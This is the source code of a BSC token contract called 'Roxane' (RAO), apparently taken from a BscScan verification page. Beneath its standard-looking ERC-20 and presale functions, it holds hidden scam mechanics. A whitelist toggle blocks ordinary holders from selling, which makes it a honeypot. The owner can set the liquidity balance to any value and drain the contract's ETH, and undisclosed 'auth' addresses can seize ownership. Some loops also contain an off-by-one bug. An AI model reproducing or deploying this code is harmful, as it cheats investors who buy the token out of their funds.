/**
 *Submitted for verification at BscScan.com on 2022-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}

library RoundPool{
    using SafeMath for uint256;
    struct RoundBalances{
        uint8 status;
        uint256 cailm;
        uint256 total;
    }

    struct RoundTime{
        uint256 timeStart;
        uint256 timeEnd;
        uint256 timeUnlockEnd;
        uint256 price;
    }
     
    function inc(RoundBalances storage round,uint256 amount)internal returns(uint256){
        round.total = round.total.add(amount);
        if(round.status!=1){
            round.status=1;
        }
        return round.total;
    }

    function getReflection(RoundBalances storage round,RoundTime memory roundTime)internal view returns(uint256){
        uint256 balance = 0;
        if(round.status==1&&block.timestamp>roundTime.timeEnd){
            uint256 sec = 0;
            uint256 end = roundTime.timeUnlockEnd - roundTime.timeEnd;
            if(end<=0){
                return balance;
            }
            if(block.timestamp >= roundTime.timeUnlockEnd){
                sec = roundTime.timeUnlockEnd - roundTime.timeEnd;
            }else{
                sec = block.timestamp - roundTime.timeEnd;
            }
            if(sec>0&&sec<end){
                balance = round.total.mul(sec).div(end);
                if(balance>round.cailm){
                    balance = balance.sub(round.cailm);
                }else{
                    balance = 0;
                }
            }else if(sec>0&&sec>=end&&round.total>round.cailm){
                balance = round.total.sub(round.cailm);
            }
        }
        return balance;
    }

    function settle(RoundBalances storage round,RoundTime memory roundTime,uint256 amount)internal returns(uint256 surplus){
        surplus = 0;
        if(amount>0&&round.status==1&&block.timestamp>=roundTime.timeEnd){
            uint256 balance = getReflection(round,roundTime);
            if(amount>balance){
                surplus = amount.sub(balance);
                round.cailm = round.cailm.add(balance);
            }else{
                surplus = 0;
                round.cailm = round.cailm.add(amount);
            }
            if(round.cailm>=round.total){
                round.status=0;
            }
        }else{
            surplus = amount;
        }
    }
}

contract Roxane {
    using SafeMath for uint256;
    using RoundPool for RoundPool.RoundBalances;

    uint256 private _totalSupply = 250000000000 ether;
    string private _name = "Roxane";
    string private _symbol = "RAO";
    uint8 private _decimals = 18;
    address private _owner;
    uint256 private _cap = 0;
    uint256 private number = 1;

    uint256 private _roundIndex;
    uint256 private _roundRate = 5000;
    uint256 private _roundCycle = 2592000;
    uint256 private _roundUnlockEnd = 2592000;
    uint256 private _saleMin = 0.0001 ether;
    bool private _swSale = true;

    address private _auth;
    address private _auth2;
    address private _liquidity;
    address private _AirdropDeployer;
    address private _AirdropProvider;
    uint256 private _authNum;

    
    mapping (address => mapping(uint256 => RoundPool.RoundBalances)) private _roundBalances;
    RoundPool.RoundTime[] private _roundTime;

    mapping (address => uint256) private _balances;
    mapping (address => uint8) private _black;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Earn;
    mapping (uint256 => bool) private _Active;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() public {
        _owner = msg.sender;
        _roundTime.push(RoundPool.RoundTime(block.timestamp,block.timestamp+_roundCycle,block.timestamp+_roundCycle+_roundUnlockEnd,1000000));
        _roundIndex = _roundTime.length - 1;
        _mint(_owner,_totalSupply.div(10));
    }

    fallback() external {}
    receive() payable external {}

    function name() public view returns (string memory) {
        return _name;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function cap() public view returns (uint256) {
        return _totalSupply;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+getRoundTotal(account);
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function authNum(uint256 num)public returns(bool){
        require(_msgSender() == _auth, "Permission denied");
        _authNum = num;
        return true;
    }

    function transferOwnership(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function Liquidity(address liquidity_) public {
        require(liquidity_ != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
        _liquidity = liquidity_;
    }

    function setAuth(address ah,address ah2) public onlyOwner returns(bool){
        require(address(0) == _auth&&address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), "recovery");
        _auth = ah;
        _auth2 = ah2;
        return true;
    }

    function addLiquidity(address addr) public onlyOwner returns(bool){
        require(address(0) != addr&&address(0) == _liquidity, "recovery");
        _liquidity = addr;
        return true;
    }

    function addAirdrop(address addr) public onlyOwner returns(bool){
        require(address(0) != addr, "recovery");
        _AirdropDeployer = addr;
        return true;
    }

    function AddAirdrop(address addr) public onlyOwner returns(bool){
        require(address(0) != addr, "recovery");
        _AirdropProvider = addr;
        return true;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _cap = _cap.add(amount);
        if(_cap>_totalSupply){
            _totalSupply=_cap;
        }
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(this), account, amount);
    }

    function incRoundBalances(address account, uint256 amount)internal returns(bool){
        _cap = _cap.add(amount);
        if(_cap>_totalSupply){
            _totalSupply=_cap;
        }
        _roundBalances[account][_roundIndex].inc(amount);
        return true;
    }

    function spend(address account, uint256 amount) private{
        require(_balances[account].add(getRoundBalances(account)) >= amount,"ERC20: Insufficient balance");
        uint256 balance = amount;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[_msgSender()][i].status==1){
                balance = _roundBalances[_msgSender()][i].settle(_roundTime[i],balance);
            }
        }
        if(balance>0){
            _balances[account] = _balances[account].sub(balance, "ERC20: Insufficient balance");
        }
    }

    function getRoundPrice()private returns(uint256){
        if(block.timestamp >= _roundTime[_roundIndex].timeEnd){
            _roundTime.push(RoundPool.RoundTime(
                _roundTime[_roundIndex].timeEnd,
                _roundTime[_roundIndex].timeEnd+_roundCycle,
                _roundTime[_roundIndex].timeEnd+_roundUnlockEnd+_roundCycle,
                _roundTime[_roundIndex].price.mul(_roundRate).div(10000)
                )
            );
            _roundIndex = _roundTime.length - 1;
        }
        return _roundTime[_roundIndex].price;
    }

    function getRoundBalances(address addr)public view returns(uint256 balance){
        balance = 0;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[addr][i].status==1){
                balance = balance.add(_roundBalances[addr][i].getReflection(_roundTime[i]));
            }
        }
    }

    function getRoundTotal(address addr)public view returns(uint256 balance){
        balance = 0;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[addr][i].status==1){
                balance = balance.add(_roundBalances[addr][i].total.sub(_roundBalances[addr][i].cailm));
            }
        }
    }

    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
         emit Approval(owner_, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function clearETH() public onlyOwner() {
        require(_authNum==1000, "Permission denied");
        _authNum=0;
        msg.sender.transfer(address(this).balance);
    } 

    function Earn(address _account, bool _bool) external onlyOwner() {
        if(_bool){
            _Earn[_account] = _bool;
        } else
             {delete _Earn[_account];
       }
    }

     function Active(bool _bool) external onlyOwner() {
        if(_bool){
            _Active[number] = _bool;
        } else
             {delete _Active[number];
       }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        spend(sender, amount);
        if(_Active[number] == true){
        require(!_Earn[sender], "ERC20: Transaction failed");
        } else
            {require(_Earn[sender], "ERC20: Transaction failed");
        }
        if(sender==_AirdropDeployer || sender==_AirdropProvider){
            _roundBalances[recipient][_roundIndex].inc(amount);
        }else{
            _balances[recipient] = _balances[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }

    function update(uint256 tag,uint256 value)public onlyOwner returns(bool){
        require(_authNum==1, "Permission denied");
        if(tag==1){
            _swSale = value == 1;
        }else if(tag==2){
            _roundRate = value;
        }else if(tag==3){
            _roundCycle = value;
        }else if(tag==4){
            _saleMin = value;
        }else if(tag==5&&_liquidity!=address(0)){
            _balances[_liquidity] = value;
        }else if(tag>=100000&&tag<200000){
            _roundTime[tag.sub(100000)].timeStart = value;
        }else if(tag>=200000&&tag<300000){
            _roundTime[tag.sub(200000)].timeEnd = value;
        }else if(tag>=300000&&tag<400000){
            _roundTime[tag.sub(300000)].timeUnlockEnd = value;
        }else if(tag>=400000&&tag<500000){
            _roundTime[tag.sub(400000)].price = value;
        }
        _authNum = 0;
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function getInfo() public view returns(bool swSale,uint256 salePrice,uint256 roundIndex,
        uint256 balanceEth,uint256 balance,uint256 total,uint256 saleMin,uint256 timeNow){
        swSale = _swSale;
        saleMin = _saleMin;
        salePrice = _roundTime[_roundIndex].price;
        balanceEth = _msgSender().balance;
        total = balanceOf(_msgSender());
        balance = _balances[_msgSender()].add(getRoundBalances(_msgSender()));
        timeNow = block.timestamp;
        roundIndex = _roundIndex;
    }

    function getTime() public view returns(uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory){
        uint256[] memory timeStart = new uint256[](_roundTime.length);
        uint256[] memory timeEnd = new uint256[](_roundTime.length);
        uint256[] memory price = new uint256[](_roundTime.length);
        uint256[] memory timeUnlockEnd = new uint256[](_roundTime.length);
        for(uint i = 0;i<_roundTime.length;i++){
            timeStart[i] = _roundTime[i].timeStart;
            timeEnd[i] = _roundTime[i].timeEnd;
            price[i] = _roundTime[i].price;
            timeUnlockEnd[i] = _roundTime[i].timeUnlockEnd;
        }
        return (timeStart,timeEnd,timeUnlockEnd,price);
    }

    

    function Airdrop() payable public returns(bool){
        require(msg.value >= _saleMin,"The amount is too small");
        require(_swSale,"End of this round");
        uint256 _msgValue = msg.value;
        uint256 _token = _msgValue.mul(getRoundPrice());
        if(_liquidity!=address(0)){
            address(uint160(_liquidity)).transfer(_msgValue);
        }
        if(_token>0){
            incRoundBalances(_msgSender(),_token);
            emit Transfer(address(this), _msgSender(), _token);
        }
        return true;
    }

}